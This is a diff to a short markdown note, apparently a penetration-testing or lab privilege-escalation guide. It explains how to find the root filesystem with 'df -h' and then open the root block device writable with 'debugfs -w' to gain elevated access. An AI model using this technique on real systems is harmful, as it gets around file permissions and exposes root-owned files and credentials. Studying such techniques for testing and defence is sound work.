@@ -13,6 +13,29 @@ We can utilize /dev/mapper/ubuntu--vg-ubuntu--lv & debugfs in order to elevate t
 
 ## Syntax
 
+1. Findout what's the root filesystem. --> /dev/sda2 in this case.
+
+```
+sysadmin@fanatastic:/$ df -h
+Filesystem      Size  Used Avail Use% Mounted on
+udev            445M     0  445M   0% /dev
+tmpfs            98M  1.2M   97M   2% /run
+/dev/sda2       9.8G  6.1G  3.3G  65% /
+tmpfs           489M     0  489M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           489M     0  489M   0% /sys/fs/cgroup
+/dev/loop0       62M   62M     0 100% /snap/core20/1328
+/dev/loop1       33M   33M     0 100% /snap/snapd/12883
+/dev/loop3       56M   56M     0 100% /snap/core18/2128
+/dev/loop6       71M   71M     0 100% /snap/lxd/21029
+/dev/loop4       68M   68M     0 100% /snap/lxd/21835
+/dev/loop2       44M   44M     0 100% /snap/snapd/14549
+/dev/loop5       56M   56M     0 100% /snap/core18/2284
+tmpfs            98M     0   98M   0% /run/user/1001
+```
+
+## Other Rootsystem but follow PoC
+
 ```
 debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
 ```
